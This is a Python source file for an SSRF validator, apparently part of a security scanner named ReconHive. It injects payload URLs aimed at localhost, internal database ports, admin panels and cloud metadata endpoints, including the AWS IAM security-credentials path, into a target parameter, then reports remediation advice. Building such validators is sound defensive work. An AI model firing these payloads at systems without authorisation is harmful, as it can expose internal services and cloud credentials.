"""
SSRF Validator

Validates SSRF vulnerabilities by:
- Testing access to localhost/127.0.0.1
- Testing cloud metadata endpoints
- Testing internal service access
- Measuring response differences
"""

import requests
import logging
import time
from typing import Dict, Any, Optional
from urllib.parse import urlencode, urlparse, parse_qs

from app.validation.base import (
    BaseValidator,
    ValidationResult,
    ValidationStatus,
    VulnerabilityType,
    SeverityLevel,
)

logger = logging.getLogger(__name__)


class SSRFValidator(BaseValidator):
    """Validates SSRF vulnerabilities"""

    @property
    def validator_type(self) -> VulnerabilityType:
        return VulnerabilityType.SSRF

    @property
    def owasp_category(self) -> str:
        return "A04: Insecure Design"

    def validate(
        self,
        target_url: str,
        parameter: str = "",
        **kwargs
    ) -> ValidationResult:
        """
        Validate SSRF without accessing sensitive data.

        Tests:
        1. Localhost access - Can app access itself?
        2. Internal services - Can app reach internal IPs?
        3. Cloud metadata - Can app access AWS/GCP/Azure metadata?
        4. Response differences - Timing analysis
        """

        result = self.create_result(
            target_url=target_url,
            parameter=parameter,
            severity=SeverityLevel.HIGH,
        )

        if not parameter:
            return result

        try:
            # Test 1: Localhost/127.0.0.1 access
            localhost_result = self._test_localhost(target_url, parameter)
            if localhost_result:
                result.is_valid = True
                result.confidence_score = 0.9
                result.payload_used = localhost_result["payload"]
                result.status = ValidationStatus.CONFIRMED

                result.reproduction_steps = [
                    f"1. Send request with {parameter}=http://127.0.0.1:80/",
                    "2. Application processes external URL",
                    "3. Response indicates server accessed localhost",
                ]

                self.add_evidence(
                    "behavior",
                    f"Server accessible via {localhost_result['payload']}",
                    "SSRF to localhost confirmed"
                )

                result.remediation = (
                    "1. Implement URL validation allowlist\n"
                    "2. Disable URL schemes (file://, gopher://)\n"
                    "3. Block internal IP ranges (10.0.0.0/8, etc.)\n"
                    "4. Use WAF to detect SSRF patterns"
                )

                self.log_validation(
                    target_url,
                    "SSRF to localhost",
                    "CONFIRMED",
                    result.confidence_score
                )
                return result

            # Test 2: Cloud metadata endpoints
            cloud_result = self._test_cloud_metadata(target_url, parameter)
            if cloud_result:
                result.is_valid = True
                result.confidence_score = 0.85
                result.payload_used = cloud_result["payload"]
                result.status = ValidationStatus.CONFIRMED

                result.reproduction_steps = [
                    f"1. Send request with {parameter}={cloud_result['payload']}",
                    "2. Application fetches cloud metadata",
                    "3. Response contains cloud environment details",
                ]

                self.add_evidence(
                    "behavior",
                    f"Cloud metadata accessible",
                    f"SSRF to {cloud_result['provider']} metadata confirmed"
                )

                result.remediation = (
                    "1. Disable cloud metadata service access\n"
                    "2. Use IMDSv2 on AWS (requires tokens)\n"
                    "3. Implement network segmentation\n"
                    "4. Monitor metadata access attempts"
                )

                self.log_validation(
                    target_url,
                    f"SSRF to {cloud_result['provider']} metadata",
                    "CONFIRMED",
                    result.confidence_score
                )
                return result

            # Test 3: Internal service detection
            internal_result = self._test_internal_services(target_url, parameter)
            if internal_result:
                result.is_valid = True
                result.confidence_score = 0.8
                result.payload_used = internal_result["payload"]
                result.status = ValidationStatus.CONFIRMED

                result.reproduction_steps = [
                    f"1. Send request with {parameter}={internal_result['payload']}",
                    "2. Application reaches internal service",
                    "3. Response timing/content indicates service access",
                ]

                self.add_evidence(
                    "behavior",
                    f"Internal service at {internal_result['service']} is accessible",
                    "SSRF to internal network confirmed"
                )

                result.remediation = (
                    "1. Network segmentation and firewall rules\n"
                    "2. Restrict outbound connections\n"
                    "3. URL validation and allowlisting\n"
                    "4. Monitor outbound requests"
                )

                self.log_validation(
                    target_url,
                    f"SSRF to internal {internal_result['service']}",
                    "CONFIRMED",
                    result.confidence_score
                )
                return result

        except Exception as e:
            logger.error(f"SSRF validation error: {str(e)}")
            result.status = ValidationStatus.NEEDS_REVIEW
            result.analyst_notes = f"Validation error: {str(e)}"

        return result

    def _test_localhost(
        self,
        url: str,
        parameter: str
    ) -> Optional[Dict[str, Any]]:
        """Test SSRF to localhost"""

        localhost_urls = [
            "http://127.0.0.1:80/",
            "http://localhost:80/",
            "http://0.0.0.0:80/",
            "http://127.0.0.1/admin",
            "http://localhost/admin",
        ]

        try:
            for payload in localhost_urls:
                response = self._make_ssrf_request(url, parameter, payload)

                if response and self._indicates_localhost_access(response):
                    return {
                        "payload": payload,
                        "response": response.text[:200],
                    }

        except Exception as e:
            logger.debug(f"Localhost test failed: {str(e)}")

        return None

    def _test_cloud_metadata(
        self,
        url: str,
        parameter: str
    ) -> Optional[Dict[str, Any]]:
        """Test SSRF to cloud metadata endpoints"""

        metadata_urls = {
            "AWS": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "GCP": "http://metadata.google.internal/computeMetadata/v1/",
            "Azure": "http://169.254.169.254/metadata/instance",
            "DigitalOcean": "http://169.254.169.254/metadata/v1/",
        }

        try:
            for provider, payload in metadata_urls.items():
                response = self._make_ssrf_request(url, parameter, payload)

                if response and self._is_valid_metadata_response(response):
                    return {
                        "payload": payload,
                        "provider": provider,
                        "response": response.text[:200],
                    }

        except Exception as e:
            logger.debug(f"Cloud metadata test failed: {str(e)}")

        return None

    def _test_internal_services(
        self,
        url: str,
        parameter: str
    ) -> Optional[Dict[str, Any]]:
        """Test SSRF to internal services"""

        internal_urls = [
            ("Redis", "http://127.0.0.1:6379/"),
            ("MongoDB", "http://127.0.0.1:27017/"),
            ("MySQL", "http://127.0.0.1:3306/"),
            ("PostgreSQL", "http://127.0.0.1:5432/"),
            ("Admin Panel", "http://127.0.0.1:8080/admin"),
        ]

        try:
            for service_name, payload in internal_urls:
                start = time.time()
                response = self._make_ssrf_request(url, parameter, payload)
                elapsed = time.time() - start

                if response:
                    # Check if service responded (timing and content)
                    if elapsed > 0.5 or len(response.text) > 50:
                        return {
                            "payload": payload,
                            "service": service_name,
                            "response": response.text[:200],
                        }

        except Exception as e:
            logger.debug(f"Internal services test failed: {str(e)}")

        return None

    def _make_ssrf_request(
        self,
        url: str,
        parameter: str,
        ssrf_payload: str
    ) -> Optional[requests.Response]:
        """Make SSRF test request"""

        try:
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            params[parameter] = [ssrf_payload]
            query = urlencode(params, doseq=True)
            test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{query}"

            response = requests.get(
                test_url,
                headers={"User-Agent": "ReconHive/1.0"},
                timeout=5,
                verify=False,
                allow_redirects=True
            )
            return response

        except requests.Timeout:
            return None
        except Exception as e:
            logger.debug(f"SSRF request failed: {str(e)}")
            return None

    def _indicates_localhost_access(self, response: requests.Response) -> bool:
        """Check if response indicates localhost was accessed"""
        indicators = [
            "localhost",
            "127.0.0.1",
            "admin",
            "dashboard",
            "internal",
        ]

        return any(indicator in response.text.lower() for indicator in indicators)

    def _is_valid_metadata_response(self, response: requests.Response) -> bool:
        """Check if response looks like cloud metadata"""
        metadata_indicators = [
            "iam-security-credentials",
            "instance-identity",
            "compute",
            "project-id",
            "access-token",
        ]

        return any(
            indicator in response.text.lower()
            for indicator in metadata_indicators
        )
